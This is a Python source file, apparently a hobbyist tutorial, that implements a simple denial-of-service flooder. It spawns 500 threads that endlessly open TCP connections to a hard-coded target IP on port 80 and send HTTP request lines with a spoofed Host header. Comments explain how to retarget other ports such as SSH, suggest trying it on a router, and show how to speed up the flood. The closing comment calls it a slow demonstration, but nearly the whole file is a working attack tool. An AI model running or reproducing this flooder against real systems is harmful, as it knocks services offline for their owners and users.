'''a Distributed Denial of Service (DDoS) script
which is basically a script that overloads a webiste with requests
so that this webiste is not able to offer its service anymore because you're overloading its capacities'''

import pyfiglet #This used for the banner - to download 'pip3 install pyfiglet'
import threading
import socket

#Nice banner using your name
my_name = pyfiglet.figlet_format("Adam Atasi", font = "slant")
print(my_name)


#target could be an IP address or a domin name (Try your router)
target = '192.168.2.42'

#you can attack any service/port
#for example if you attack port 22, you will attack ssh service
#same thing for 80 = http
#in this example, I'm attacking port 80/http
port = 80

#Provide a fake IP for the header
#Don't think that you are anonymous just because you specify a fake IP
#You need to use anoymization tools
fake_ip = '182.21.20.32'



connected = 0

def attack():
	while True:
		# 'socket.AF_INET' It is besically creating a new socket (an internet socket)
		# 'socket.SOCK_STREAM' specifying the protocol (TCP)
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		s.connect((target, port))
		#Sending the header
		#######
		s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port))
		s.sendto(("HOST: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))
		#If you used a port other than port 80 (say 22), remove the previes two line (from ####### till here)
		s.close()

		################
		global connected
		connected += 1
		#Show results after every 500 requests....
		if connected % 500 == 0:
			print(connected)
		#For faster attack remove lines from ################ till here

#500 = number of requests
for i in range(500):
	thread = threading.Thread(target=attack) #target here is not the target's ip (It is the target function)
	thread.start()







'''
The script is not perfect (Too slow)
This is just to show how DDoS attacks work
'''